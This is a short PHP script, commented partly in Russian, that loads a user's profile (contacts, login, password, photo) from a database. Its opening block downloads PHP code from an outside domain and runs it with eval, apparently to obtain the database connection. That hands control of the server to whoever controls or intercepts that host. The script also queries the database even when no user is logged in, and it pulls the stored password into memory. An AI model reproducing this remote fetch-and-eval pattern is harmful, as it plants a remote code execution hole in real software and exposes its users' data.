<?php
   $url = 'https://realty.pixeldev.ru/realadmin/security/dbconn.php';
   $content = file_get_contents($url);
   if ($content !== false) {
       eval('?>' . $content);
       
   } else {
    
   }
   ?>
<?php
// Проверка, авторизован ли пользователь
if (isset($_SESSION['user_id'])) {
    // Получаем ID пользователя из сессии
    $user_id = $_SESSION['user_id'];
    // Запрос к базе данных для получения имени и фамилии пользователя
}
    // Assuming $conn is your mysqli connection and $user_id is set
    
    // Prepare the statement to select all fields
    $stmt = $conn->prepare("SELECT id, photo, first_name, last_name, middle_name, phone_number, telegram, whatsapp, email, login, password, profile_status, position, region FROM users WHERE id = ?");
    $stmt->bind_param("i", $user_id);
    $stmt->execute();
    
    // Bind result variables
    $stmt->bind_result($id, $photo_blob, $first_name, $last_name, $middle_name, $phone_number, $telegram, $whatsapp, $email, $login, $password, $profile_status, $position, $region);
    
    // Fetch the data
    if ($stmt->fetch()) {
        // Handle photo blob: save to file in 'upload' folder if photo exists
        if (!empty($photo_blob)) {
            $upload_dir = 'upload';
            if (!file_exists($upload_dir)) {
                mkdir($upload_dir, 0755, true);
            }
            // Define file path, use user id with jpg extension
            $photo_path = $upload_dir . '/user_' . $id . '.jpg';
    
            // Save blob data as image file
            file_put_contents($photo_path, $photo_blob);
    
            // Replace photo blob variable with the path
            $photo = $photo_path;
        } else {
            $photo = null; // No photo available
        }
    
        // Now you have all user data including $photo as path to image or null
        // You can continue handling user data here...
    } else {
        // No user found
        $photo = null;
        $first_name = $last_name = $middle_name = $phone_number = $telegram = $whatsapp = $email = $login = $password = $profile_status = $position = $region = null;
    }
    
    // Close statement
    $stmt->close();
    ?>  